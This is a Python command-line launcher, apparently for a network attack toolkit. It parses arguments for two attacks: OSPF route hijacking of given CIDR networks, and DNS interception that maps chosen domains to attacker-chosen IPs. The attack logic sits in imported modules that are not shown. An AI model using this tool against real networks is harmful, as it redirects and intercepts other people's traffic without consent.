import argparse
from ospf_hijack import ospf_hijack
from dns_hijack import *

def main():
  parser = argparse.ArgumentParser()
  subparsers = parser.add_subparsers(dest='attack')
  subparsers.required = True
  
  ospf_subparser = subparsers.add_parser('ospf')
  ospf_subparser.add_argument('--networks',
    nargs='+',
    type=str,
    action='store',
    help="Space-separated network addresses in CIDR notation",
    required=True)

  dns_subparser = subparsers.add_parser('dns')
  dns_subparser.add_argument('--map',
    nargs='+',
    type=str,
    action='store',
    help="Space separated mappings, each key-value being colon-separated",
    required=True
  )

  args = parser.parse_args()
  attack = args.attack

  if attack == 'ospf':
    ospf_hijack(networks=args.networks)
  
  if attack == 'dns':
    # Colon separated key-value
    separator = ':'
    mapping_dict = {}
    for mapping in args.map:
      [domain_name, answer_ip] = mapping.split(separator)
      mapping_dict[domain_name] = answer_ip

    intercept_dns(mapping_dict)
    

if __name__ == '__main__':
  main()